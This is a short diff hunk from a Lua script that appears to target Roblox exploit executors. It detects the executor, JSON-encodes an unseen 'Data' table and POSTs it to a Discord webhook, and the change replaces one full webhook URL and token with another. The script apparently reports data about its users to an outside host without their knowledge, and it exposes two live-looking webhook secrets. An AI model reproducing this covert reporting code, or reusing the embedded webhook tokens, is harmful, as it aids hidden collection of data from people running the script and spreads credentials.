@@ -26,7 +26,7 @@ local ExecutorUsing = is_sirhurt_closure and "Sirhurt" or pebc_execute and "Prot
                     local Encoded = HttpService:JSONEncode(Data)
                     
                     Request = http_request or request or HttpPost or syn.request
-                    local Final = {Url = "https://discord.com/api/webhooks/1094159219659395142/d-JevrcKUqybXvAtkwr9ZdPEJZEGiJ6h-SQm0O6w7r9ZogRpkMVij88F67iTR15tOS6E", Body = Encoded, Method = "POST", Headers = Headers}
+                    local Final = {Url = "https://discord.com/api/webhooks/1094158991153692672/IwWNNYzxlZ6hj1C7sr8puBDzgRl83cWnqcuJ5rVUVxN2-clf6BpC7mbd0Xkq288qJCgp", Body = Encoded, Method = "POST", Headers = Headers}
                     Request(Final)
 
 local ScreenGui = Instance.new("ScreenGui")
